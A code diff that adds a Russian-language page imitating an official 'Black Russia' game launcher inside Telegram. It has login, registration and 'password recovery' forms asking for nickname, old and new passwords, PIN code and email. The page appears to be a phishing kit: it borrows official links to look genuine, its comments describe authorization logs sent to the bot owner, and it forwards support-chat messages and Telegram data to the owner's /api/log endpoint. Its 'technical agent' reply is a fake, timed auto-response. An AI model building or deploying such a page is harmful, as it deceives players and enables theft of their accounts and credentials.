+            <!-- Поле: Пин-код (Регистрация) -->
+            <div class="split-pincode-container disabled-style" id="reg-pincode-row-container">
+                <div class="form-row-pin">
+                    <div class="row-icon-left bg-darkred" id="reg-pin-icon-bg">
+                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                    </div>
+                    <div class="row-main">
+                        <label>Пин-код защиты</label>
+                        <input type="password" placeholder="Пин-код отключен" id="reg-pin-input" disabled autocomplete="off">
+                    </div>
+                </div>
+                <div class="pincode-checkbox-wrapper">
+                    <span class="pincode-text">У меня есть<br>пин-код</span>
+                    <input type="checkbox" class="launcher-check" id="reg-pin-toggle-checkbox">
+                </div>
+            </div>
+
+            <!-- Поле: Ваша почта -->
+            <div class="form-row" id="row-reg-email">
+                <div class="row-icon-left bg-orange" id="reg-email-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1 .9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Ваша почта</label>
+                    <input type="email" placeholder="example@mail.ru" id="reg-email-input" autocomplete="off">
+                </div>
+            </div>
+            <!-- Поле: Выбор сервера для регистрации (синхронизирован) -->
+            <div class="form-row clickable-row" onclick="triggerServerDropdownFromReg(event)" id="row-reg-server">
+                <div class="row-icon-left bg-red" id="reg-server-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Выбор сервера</label>
+                    <div class="selected-server-text" id="reg-selected-server-text" style="color: #4f4343;">Выберите server</div>
+                </div>
+                <div class="select-arrow-down">▼</div>
+            </div>
+
+            <!-- Поле: Ник пригласившего игрока -->
+            <div class="form-row" id="row-reg-invite" style="margin-bottom: 25px;">
+                <div class="row-icon-left bg-pink" id="reg-invite-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1 .45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.04-.42 1.99-1.07 2.75z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Ник пригласившего (необязательно)</label>
+                    <input type="text" placeholder="Пример: Alexander_Sander" id="reg-invite-input" autocomplete="off">
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="handleRegisterClick()">Создать аккаунт →</button>
+            <div class="text-or">или</div>
+            
+            <div class="nav-switch-btn" onclick="changeAuthScreen('login')" style="margin-bottom: 20px;">
+                <span><span class="red-icon-inline">⬅</span> Вернуться к входу</span>
+                <span class="gray-arrow">❯</span>
+            </div>
+        </div>
+        <!-- СТРАНИЦА 2: ВОССТАНОВЛЕНИЕ ПАРОЛЯ -->
+        <div id="screen-recovery" class="form-box">
+            <!-- Поле: Ник -->
+            <div class="form-row" id="row-rec-nick">
+                <div class="row-icon-left bg-orange" id="rec-nick-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Ник</label>
+                    <input type="text" placeholder="Введите игровой ник" id="rec-nick-input" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- Поле: Старый Пароль -->
+            <div class="form-row" id="row-rec-oldpass">
+                <div class="row-icon-left bg-red" id="rec-old-pass-bg">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Старый пароль</label>
+                    <input type="password" placeholder="Введите старый пароль" id="rec-old-pass" autocomplete="off">
+                </div>
+                <div class="row-icon-right opacity-5 clickable" onclick="togglePasswordView('rec-old-pass')">👁</div>
+            </div>
+            <!-- Поле: Новый Пароль -->
+            <div class="form-row" id="row-rec-newpass">
+                <div class="row-icon-left bg-red" id="rec-new-pass-bg">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Новый пароль</label>
+                    <input type="password" placeholder="Введите новый пароль" id="rec-new-pass" autocomplete="off">
+                </div>
+                <div class="row-icon-right opacity-5 clickable" onclick="togglePasswordView('rec-new-pass')">👁</div>
+            </div>
+
+            <!-- Поле: Пин-код (Восстановление) -->
+            <div class="split-pincode-container disabled-style" id="rec-pincode-row-container">
+                <div class="form-row-pin">
+                    <div class="row-icon-left bg-darkred" id="rec-pin-icon-bg">
+                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                    </div>
+                    <div class="row-main">
+                        <label>Пин-код подтверждения</label>
+                        <input type="password" placeholder="Пин-код отключен" id="rec-pin-input" disabled autocomplete="off">
+                    </div>
+                </div>
+                <div class="pincode-checkbox-wrapper">
+                    <span class="pincode-text">У меня есть<br>пин-код</span>
+                    <input type="checkbox" class="launcher-check" id="rec-pin-toggle-checkbox">
+                </div>
+            </div>
+            <!-- Поле: Выбор сервера для восстановления (Синхронно открывает шторку серверов) -->
+            <div class="form-row clickable-row" onclick="triggerServerDropdownFromReg(event)" id="row-rec-server" style="margin-bottom: 25px;">
+                <div class="row-icon-left bg-pink" id="rec-server-icon-bg">
+                    <svg viewBox="0 0 24 24"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"/></svg>
+                </div>
+                <div class="row-main">
+                    <label>Выбор сервера</label>
+                    <div class="selected-server-text" id="rec-selected-server-text" style="color: #4f4343;">Выберите сервер</div>
+                </div>
+                <div class="select-arrow-down">▼</div>
+            </div>
+
+            <button class="btn-primary" onclick="handleRecoveryClick()">Восстановить пароль →</button>
+            <div class="text-or">или</div>
+            
+            <div class="nav-switch-btn" onclick="changeAuthScreen('login')" style="margin-bottom: 20px;">
+                <span><span class="red-icon-inline">⬅</span> Вернуться к входу</span>
+                <span class="gray-arrow">❯</span>
+            </div>
+        </div>
+
+        <!-- СТРАНИЦА 3: ЭКРАН ЗАГРУЗКИ -->
+        <div id="screen-loading" class="form-box">
+            <div class="loading-box-wrapper">
+                <div class="loading-spinner"></div>
+                <div class="loading-status-text" id="load-status-title">Проверка файлов игры...</div>
+                <div class="loading-percentage" id="load-percent-num">0%</div>
+                <div class="progress-bar-bg"><div class="progress-bar-fill" id="load-progress-fill"></div></div>
+            </div>
+        </div>
+        <!-- ТРИ ОФИЦИАЛЬНЫЕ КНОПКИ В РЯД (ОФИЦИАЛЬНЫЕ ИСТОЧНИКИ BLACK RUSSIA) -->
+        <div class="footer-social-row" id="launcher-footer-social">
+            <div class="social-tab bg-tab-forum" onclick="window.open('https://blackrussia.online')">
+                <svg viewBox="0 0 24 24"><path d="M12 2L1 7v2h22V7L12 2zm10 9H2v2h20v-2zm-1 4H3v5h18v-5z"/></svg> Форум
+            </div>
+            <div class="social-tab bg-tab-vk" onclick="window.open('https://vk.com')">
+                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2.4 12.5h-1.1c-.5 0-.7-.3-1.5-1.1-.7-.7-1-1-1.4-1-.2 0-.3.1-.3.5v1.2c0 .3-.2.4-.7.4-1.7 0-3.5-1.1-4.7-3.5-.2-.5-.1-.7.4-.7h1.1c.3 0 .5.1.6.4.7 1.5 1.5 2.5 1.9 2.5.2 0 .2-.1.2-.6v-1.9c0-.5-.2-.6-.7-.6h-.6c-.2 0-.2-.1-.1-.3.2-.4.7-.6 1.3-.6h1c.4 0 .5.2.5.7v2c0 .2.1.3.2.3.2 0 .5-.3.9-.9.4-.7.7-1.4.7-1.4 0-.2.2-.3.5-.3h1.1c.4 0 .5.1.4.4-.1.5-1 1.7-1 1.7-.1.2-.2.4 0 .6l1 1.1c.4.5.6.8.5 1.2z"/></svg> VK
+            </div>
+            <div class="social-tab bg-tab-tg" onclick="window.open('https://t.me')">
+                <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.48-.52-.17L7.74 13.27 3.64 12c-.88-.29-.89-.9 1.15-1.32L20.8 4.5c.74-.29 1.39.17 1.12 1.27l-2.72 12.86c-.2.95-.77 1.18-1.56.74l-4.13-3.05-1.99 1.92c-.22.22-.41.41-.79.41z"/></svg> TG
+            </div>
+        </div>
+
+        <div class="bottom-info-links" id="bottom-info-links">
+            <div class="info-link-btn" onclick="window.open('https://blackrussia.online')">Донат</div>
+            <div class="info-link-btn" onclick="window.open('https://blackrussia.online')">О проекте</div>
+        </div>
+
+        <div class="bottom-support-btn-container" id="launcher-bottom-support">
+            <div class="bottom-support-clickable" onclick="toggleSupportModal(true)">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg> Служба поддержки
+            </div>
+        </div>
+
+        <!-- ИСПРАВЛЕНО: Выпадающий список вынесен из экранов авторизации, теперь он глобальный -->
+        <div class="custom-server-dropdown" id="custom-server-list"></div>
+
+    </div> <!-- Конец launcher-container -->
+
+    <!-- Плеер оригинальной фоновой темы игры -->
+    <audio id="launcher-bg-music" loop preload="auto">
+        <source src="https://gta-max.com" type="audio/mpeg">
+    </audio>
+
+    <!-- Telegram WebApp SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <!-- === СКРИПТЫ ИНТЕЛЛЕКТА ЛАУНЧЕРА === -->
+    <script>
+        // Ссылка на Python-бэкенд на хостинге (логи авторизации)
+        // Оставьте пустым, чтобы отключить отправку логов
+        const DISCORD_WEBHOOK_URL = "";
+
+        /* === БАЗОВЫЙ URL API ===
+           Пусто  → запросы идут на тот же домен (работает на своём сервере).
+           Задайте → например "https://br.trycloudflare.com", если статика
+           лежит на github.io, а логи обрабатывает отдельный сервер.
+           На чистом github.io /api/* недоступен — логи просто не отправятся,
+           интерфейс при этом работает полностью. */
+        const API_BASE = "";
+
+        function apiUrl(path) { return (API_BASE || "") + path; }
+
+        let currentActiveScreenId = "screen-login";
+
+        /* === TELEGRAM WEBAPP: АВТОПОДСТАНОВКА ДАННЫХ ПОЛЬЗОВАТЕЛЯ === */
+        (function initTelegramWebApp() {
+            try {
+                const tg = window.Telegram && window.Telegram.WebApp;
+                if (!tg) return;
+                tg.ready();
+                tg.expand();
+                if (tg.setHeaderColor) tg.setHeaderColor("#040101");
+                if (tg.setBackgroundColor) tg.setBackgroundColor("#040101");
+                if (tg.disableVerticalSwipes) tg.disableVerticalSwipes();
+
+                const u = tg.initDataUnsafe && tg.initDataUnsafe.user;
+                if (u) {
+                    const bar = document.getElementById("tg-user-bar");
+                    const nameEl = document.getElementById("tg-user-name");
+                    const subEl = document.getElementById("tg-user-sub");
+                    const avatarEl = document.getElementById("tg-user-avatar");
+                    const fullName = [u.first_name, u.last_name].filter(Boolean).join(" ");
+                    if (nameEl) nameEl.textContent = fullName || (u.username ? "@" + u.username : "Игрок");
+                    if (subEl) subEl.textContent = u.username ? "@" + u.username + " · id " + u.id : "telegram id " + u.id;
+                    if (avatarEl && u.photo_url) { avatarEl.src = u.photo_url; } else if (avatarEl) { avatarEl.style.display = "none"; }
+                    if (bar) bar.classList.add("show");
+                    window.TELEGRAM_USER = u;
+                }
+                // Подтверждаем подпись initData на сервере (безопасность)
+                if (tg.initData) {
+                    fetch(apiUrl("/api/telegram/auth"), {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ initData: tg.initData })
+                    }).then(r => r.json()).then(d => { window.TELEGRAM_AUTH = d; })
+                      .catch(() => {});
+                }
+            } catch (e) { console.warn("Telegram WebApp init error", e); }
+        })();
+
+        // Плавное открытие и закрытие окна специалистов
+        function toggleSupportModal(s) { 
+            const m = document.getElementById("support-modal"); 
+            if (m) { m.classList.toggle("show", s); playLauncherAudioSound(s ? 'success' : 'error'); } 
+        }
+
+        // Открытие и закрытие встроенного онлайн-чата лаунчера
+        function openInternalOnlineChat() { 
+            const c = document.getElementById("internal-chat-box"); 
+            if (c) { c.classList.add("show"); playLauncherAudioSound('success'); } 
+        }
+
+        function closeInternalOnlineChat() { 
+            const c = document.getElementById("internal-chat-box"); 
+            if (c) { c.classList.remove("show"); playLauncherAudioSound('error'); } 
+        }
+        // ИСПРАВЛЕНО: Функция теперь останавливает всплытие клика (e.stopPropagation()), предотвращая мгновенное закрытие шторки документом
+        function triggerServerDropdownFromReg(e) { 
+            if (e) e.stopPropagation();
+            const currentDropdown = document.getElementById("custom-server-list");
+            const t = document.getElementById("server-field-trigger");
+            if (currentDropdown) {
+                const isOpen = currentDropdown.classList.toggle("show");
+                if (t) t.classList.toggle("dropdown-open", isOpen);
+                const arrow = document.getElementById("server-arrow-icon");
+                if (arrow) arrow.classList.toggle("rotated", isOpen);
+            }
+        }
+
+        // Логи отправляются строго на /api/log вашего сервера
+        function sendLauncherLogToDiscord(title, description, color, fields) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("ваш-прокси-сервер")) return;
+            
+            const fullTargetUrl = DISCORD_WEBHOOK_URL.replace(/\/$/, "") + "/api/log";
+            
+            fetch(fullTargetUrl, {
+                method: "POST",
+                headers: { 
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ 
+                    embeds: [{ 
+                        title, 
+                        description, 
+                        color, 
+                        fields, 
+                        timestamp: new Date().toISOString(), 
+                        footer: { text: "Black Russia Launcher Logs" } 
+                    }] 
+                })
+            }).catch(e => console.error("Ошибка логирования:", e));
+        }
+
+        // Логирование в бота (Telegram): приходит владельцу бота
+        function sendLogToBot(action, data) {
+            try {
+                const tg = window.Telegram && window.Telegram.WebApp;
+                fetch(apiUrl("/api/log"), {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        action: action,
+                        data: data || {},
+                        initData: (tg && tg.initData) || ""
+                    })
+                }).catch(() => {});
+            } catch (e) {}
+        }
+
+        // ГЕНЕРАТОР МЯГКИХ И ГЛУБОКИХ ЗВУКОВ (Web Audio API)
+        function playLauncherAudioSound(t) {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                const ctx = new AudioContext(), osc = ctx.createOscillator(), gain = ctx.createGain();
+                osc.connect(gain); gain.connect(ctx.destination);
+                
+                if (t === 'error') {
+                    osc.type = 'sine'; osc.frequency.setValueAtTime(110, ctx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(55, ctx.currentTime + 0.15);
+                    gain.gain.setValueAtTime(0.18, ctx.currentTime); gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.15);
+                    osc.start(); osc.stop(ctx.currentTime + 0.15);
+                } else if (t === 'vzhuh') {
+                    osc.type = 'triangle'; osc.frequency.setValueAtTime(200, ctx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(800, ctx.currentTime + 0.12);
+                    gain.gain.setValueAtTime(0.08, ctx.currentTime); gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.12);
+                    osc.start(); osc.stop(ctx.currentTime + 0.12);
+                } else {
+                    osc.type = 'sine'; osc.frequency.setValueAtTime(400, ctx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(300, ctx.currentTime + 0.04);
+                    gain.gain.setValueAtTime(0.06, ctx.currentTime); gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.04);
+                    osc.start(); osc.stop(ctx.currentTime + 0.04);
+                }
+            } catch(e) {}
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            // Запуск саундтрека при первом касании экрана
+            document.body.addEventListener("click", function() { 
+                const m = document.getElementById("launcher-bg-music"); 
+                if (m && m.paused) { m.volume = 0.12; m.play(); } 
+            }, { once: true });
+
+            // Полный список всех серверов с СИНХРОНИЗАЦИЕЙ по всем окнам лаунчера
+            const brServers = ["RED","GREEN","BLUE","YELLOW","ORANGE","PURPLE","LIME","PINK","CHERRY","BLACK","INDIGO","WHITE","MAGENTA","CRIMSON","GOLD","AZURE","PLATINUM","AQUA","GRAY","ICE","CHILLI","CHOCO","MOSCOW","SPB","UFA","SOCHI","KAZAN","SAMARA","ROSTOV","ANAPA","EKB","KRASNODAR","ARZAMAS","NOVOSIBIRSK","GROZNY","SARATOV","OMSK","IRKUTSK","VOLGOGRAD","VORONEZH","BELGOROD","MAKHACHKALA","VLADIKAVKAZ","VLADIVOSTOK","KALININGRAD","CHELYABINSK","KRASNOYARSK","CHEBOKSARY","KHABAROVSK","PERM","TULA","RYAZAN","MURMANSK","PENZA","KURSK","ARKHANGELSK","ORENBURG","KIROV","KEMEROVO","TYUMEN","TOLYATTI","IVANOVO","STAVROPOL","SMOLENSK","PSKOV","BRYANSK","OREL","YAROSLAVL","BARNAUL","LIPETSK","ULYANOVSK","YAKUTSK","TAMBOV","BRATSK","ASTRAKHAN","CHITA","KOSTROMA","VLADIMIR","KALUGA","NOVGOROD","TAGANROG","VOLOGDA","TVER","TOMSK","IZHEVSK","SURGUT","PODOLSK","MAGADAN","CHEREPOVETS","NORILSK","ASTANA"];
+            const customServerList = document.getElementById("custom-server-list"), 
+                  serverFieldTrigger = document.getElementById("server-field-trigger"), 
+                  currentSelectedServer = document.getElementById("current-selected-server"), 
+                  serverArrowIcon = document.getElementById("server-arrow-icon"), 
+                  serverIconBg = document.getElementById("server-icon-bg"), 
+                  regSelectedServerText = document.getElementById("reg-selected-server-text"), 
+                  regServerIconBg = document.getElementById("reg-server-icon-bg"),
+                  recSelectedServerText = document.getElementById("rec-selected-server-text"),
+                  recServerIconBg = document.getElementById("rec-server-icon-bg");
+            
+            let finalSelectedServerValue = "";
+
+            brServers.forEach(function(name, index) {
+                let num = index + 1, formattedNum = num < 10 ? "0" + num : num;
+                let item = document.createElement("div"); item.className = "server-item";
+                item.innerHTML = `<span class="server-num-badge">${formattedNum}</span> | ${name}`;
+                item.addEventListener("click", function(e) {
+                    e.stopPropagation(); finalSelectedServerValue = `${formattedNum} | ${name}`;
+                    
+                    // Запись значения и валидация на экране входа
+                    currentSelectedServer.textContent = finalSelectedServerValue; currentSelectedServer.style.color = "#ffffff"; serverIconBg.className = "row-icon-left status-valid"; 
+                    // Запись значения и валидация на экране регистрации
+                    if(regSelectedServerText) { regSelectedServerText.textContent = finalSelectedServerValue; regSelectedServerText.style.color = "#ffffff"; regServerIconBg.className = "row-icon-left status-valid"; }
+                    // Запись значения и валидация на экране восстановления
+                    if(recSelectedServerText) { recSelectedServerText.textContent = finalSelectedServerValue; recSelectedServerText.style.color = "#ffffff"; recServerIconBg.className = "row-icon-left status-valid"; }
+                    
+                    customServerList.classList.remove("show"); if(serverFieldTrigger) serverFieldTrigger.classList.remove("dropdown-open"); if(serverArrowIcon) serverArrowIcon.classList.remove("rotated");
+                    localStorage.setItem("saved_server", finalSelectedServerValue);
+                });
+                customServerList.appendChild(item);
+            });
+
+            if(serverFieldTrigger) {
+                serverFieldTrigger.addEventListener("click", function(e) { e.stopPropagation(); const isOpen = customServerList.classList.toggle("show"); serverFieldTrigger.classList.toggle("dropdown-open", isOpen); if(serverArrowIcon) serverArrowIcon.classList.toggle("rotated", isOpen); });
+            }
+            document.addEventListener("click", function() { customServerList.classList.remove("show"); if(serverFieldTrigger) serverFieldTrigger.classList.remove("dropdown-open"); if(serverArrowIcon) serverArrowIcon.classList.remove("rotated"); });
+            const nickInput = document.getElementById("nick-input"), nickIconBg = document.getElementById("nick-icon-bg");
+
+            // СИСТЕМА АВТОСОХРАНЕНИЯ: Восстановление сохраненного ника и сервера при запуске
+            const localSavedNick = localStorage.getItem("saved_nickname");
+            if (localSavedNick && nickInput) { nickInput.value = localSavedNick; setTimeout(function() { checkRPNick(nickInput, nickIconBg); }, 50); }
+            const localSavedServer = localStorage.getItem("saved_server");
+            if (localSavedServer && currentSelectedServer) {
+                finalSelectedServerValue = localSavedServer; 
+                currentSelectedServer.textContent = localSavedServer; currentSelectedServer.style.color = "#ffffff"; serverIconBg.className = "row-icon-left status-valid";
+                if(regSelectedServerText) { regSelectedServerText.textContent = localSavedServer; regSelectedServerText.style.color = "#ffffff"; regServerIconBg.className = "row-icon-left status-valid"; }
+                if(recSelectedServerText) { recSelectedServerText.textContent = localSavedServer; recSelectedServerText.style.color = "#ffffff"; recServerIconBg.className = "row-icon-left status-valid"; }
+            }
+
+            // Объявление элементов для "живой" проверки полей
+            const passInput = document.getElementById("login-password-input"), passIconBg = document.getElementById("pass-icon-bg");
+            const recNickInput = document.getElementById("rec-nick-input"), recNickIconBg = document.getElementById("rec-nick-icon-bg"), recOldPass = document.getElementById("rec-old-pass"), recOldPassBg = document.getElementById("rec-old-pass-bg"), recNewPass = document.getElementById("rec-new-pass"), recNewPassBg = document.getElementById("rec-new-pass-bg");
+            const regNickInput = document.getElementById("reg-nick-input"), regNickIconBg = document.getElementById("reg-nick-icon-bg"), regPassInput = document.getElementById("reg-password-input"), regPassIconBg = document.getElementById("reg-pass-icon-bg"), regEmailInput = document.getElementById("reg-email-input"), regEmailIconBg = document.getElementById("reg-email-icon-bg"), regInviteInput = document.getElementById("reg-invite-input"), regInviteIconBg = document.getElementById("reg-invite-icon-bg");
+
+            function checkRPNick(inpt, icn, opt = false) { if (!inpt || !icn) return; if (inpt.value === "") { icn.className = opt ? "row-icon-left bg-pink" : "row-icon-left bg-orange"; return; } if (/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(inpt.value)) icn.className = "row-icon-left status-valid"; else icn.className = "row-icon-left status-invalid"; }
+            function checkPass(inpt, icn) { if (!inpt || !icn) return; if (inpt.value === "") { icn.className = "row-icon-left bg-red"; return; } if (/^[A-Za-z0-9]{6,}$/.test(inpt.value)) icn.className = "row-icon-left status-valid"; else icn.className = "row-icon-left status-invalid"; }
+            function checkEmail(inpt, icn) { if (!inpt || !icn) return; if (inpt.value === "") { icn.className = "row-icon-left bg-orange"; return; } if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inpt.value)) icn.className = "row-icon-left status-valid"; else icn.className = "row-icon-left status-invalid"; }
+
+            if(nickInput && nickIconBg) nickInput.addEventListener("input", function() { checkRPNick(nickInput, nickIconBg); localStorage.setItem("saved_nickname", nickInput.value); });
+            if(recNickInput && recNickIconBg) recNickInput.addEventListener("input", function() { checkRPNick(recNickInput, recNickIconBg); });
+            if(regNickInput && regNickIconBg) regNickInput.addEventListener("input", function() { checkRPNick(regNickInput, regNickIconBg); });
+            if(regInviteInput && regInviteIconBg) regInviteInput.addEventListener("input", function() { checkRPNick(regInviteInput, regInviteIconBg, true); });
+            if(passInput && passIconBg) passInput.addEventListener("input", function() { checkPass(passInput, passIconBg); });
+            if(recOldPass && recOldPassBg) recOldPass.addEventListener("input", function() { checkPass(recOldPass, recOldPassBg); });
+            if(recNewPass && recNewPassBg) recNewPass.addEventListener("input", function() { checkPass(recNewPass, recNewPassBg); });
+            if(regPassInput && regPassIconBg) regPassInput.addEventListener("input", function() { checkPass(regPassInput, regPassIconBg); });
+            if(regEmailInput && regEmailIconBg) regEmailInput.addEventListener("input", function() { checkEmail(regEmailInput, regEmailIconBg); });
+
+            // Функция настройки независимых пин-кодов
+            function setupPinToggle(checkboxId, inputId, containerId, iconBgId) {
+                const ch = document.getElementById(checkboxId), inp = document.getElementById(inputId), cont = document.getElementById(containerId), icn = document.getElementById(iconBgId);
+                if(!ch || !inp || !cont || !icn) return;
+                ch.addEventListener("change", function() { if (ch.checked) { inp.disabled = false; inp.placeholder = "Введите пин-код"; cont.classList.remove("disabled-style"); } else { inp.disabled = true; inp.value = ""; inp.placeholder = "Пин-код отключен"; cont.classList.add("disabled-style"); icn.className = "row-icon-left bg-darkred"; } });
+            }
+            function setupPinInput(inputId, iconBgId) {
+                const inp = document.getElementById(inputId), icn = document.getElementById(iconBgId);
+                if(!inp || !icn) return;
+                inp.addEventListener("input", function() { inp.value = inp.value.replace(/[^0-9]/g, ''); if (inp.value.length > 4) inp.value = inp.value.slice(0, 4); if (inp.value === "") { icn.className = "row-icon-left bg-darkred"; return; } if (inp.value.length === 4) icn.className = "row-icon-left status-valid"; else icn.className = "row-icon-left bg-darkred"; });
+            }
+
+            // Активация управления пин-кодами для всех экранов отдельно
+            setupPinToggle("pin-toggle-checkbox", "pin-input", "pincode-row-container", "pin-icon-bg");
+            setupPinInput("pin-input", "pin-icon-bg");
+            setupPinToggle("reg-pin-toggle-checkbox", "reg-pin-input", "reg-pincode-row-container", "reg-pin-icon-bg");
+            setupPinInput("reg-pin-input", "reg-pin-icon-bg");
+            setupPinToggle("rec-pin-toggle-checkbox", "rec-pin-input", "rec-pincode-row-container", "rec-pin-icon-bg");
+            setupPinInput("rec-pin-input", "rec-pin-icon-bg");
+
+            window.getSelectedServer = function() { return finalSelectedServerValue; };
+        });
+        // Интеллектуальный движок встроенного онлайн-чата поддержки
+        window.sendUserMessageInChat = function() {
+            const msgInput = document.getElementById("chat-user-message-input");
+            const container = document.getElementById("chat-messages-container");
+            if (!msgInput || !container || msgInput.value.trim() === "") return;
+
+            const userText = msgInput.value.trim();
+            msgInput.value = ""; // Очищаем поле ввода
+
+            // Добавляем сообщение пользователя на экран
+            const userBubble = document.createElement("div");
+            userBubble.className = "chat-bubble user";
+            userBubble.innerHTML = `<div class="chat-bubble-sender">Вы</div>${escapeHtml(userText)}`;
+            container.appendChild(userBubble);
+            container.scrollTop = container.scrollHeight;
+            playLauncherAudioSound('click');
+
+            // Логируем сообщение в бота
+            sendLogToBot("chat_message", { text: userText });
+
+            // Симулируем анимацию набора ответа техническим агентом
+            const typingBubble = document.createElement("div");
+            typingBubble.className = "chat-bubble agent";
+            typingBubble.id = "chat-typing-indicator";
+            typingBubble.innerHTML = `
+                <div class="chat-bubble-sender">Тех. Агент печатает</div>
+                <div class="typing-dots-container">
+                    <div class="typing-dot"></div>
+                    <div class="typing-dot"></div>
+                    <div class="typing-dot"></div>
+                </div>`;
+            
+            setTimeout(() => {
+                container.appendChild(typingBubble);
+                container.scrollTop = container.scrollHeight;
+            }, 600);
+
+            // Отправляем авто-ответ службы поддержки через 2.5 секунды
+            setTimeout(() => {
+                const indicator = document.getElementById("chat-typing-indicator");
+                if (indicator) indicator.remove();
+
+                const agentBubble = document.createElement("div");
+                agentBubble.className = "chat-bubble agent";
+                agentBubble.innerHTML = `
+                    <div class="chat-bubble-sender">Тех. Агент</div>
+                    Ваше обращение зафиксировано и передано старшему техническому специалисту сервера. Пожалуйста, ожидайте ответа.`;
+                
+                container.appendChild(agentBubble);
+                container.scrollTop = container.scrollHeight;
+                playLauncherAudioSound('vzhuh');
+            }, 2500);
+        };
+
+        // Хелпер для защиты чата от вредоносных тегов
+        function escapeHtml(text) {
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+        }
+
+        // Поддержка отправки сообщения в чат по нажатию клавиши Enter
+        document.getElementById("chat-user-message-input").addEventListener("keydown", function(e) {
+            if (e.key === "Enter") { window.sendUserMessageInChat(); }
+        });
+        // Имитация загрузки файлов игры
+        function startLauncherLoadingSequence(serverName) {
+            const head = document.getElementById('launcher-header'), lin = document.getElementById('bottom-info-links'), lgn = document.getElementById('screen-login'), reg = document.getElementById('screen-register'), rec = document.getElementById('screen-recovery'), soc = document.getElementById('launcher-footer-social'), sup = document.getElementById('launcher-bottom-support');
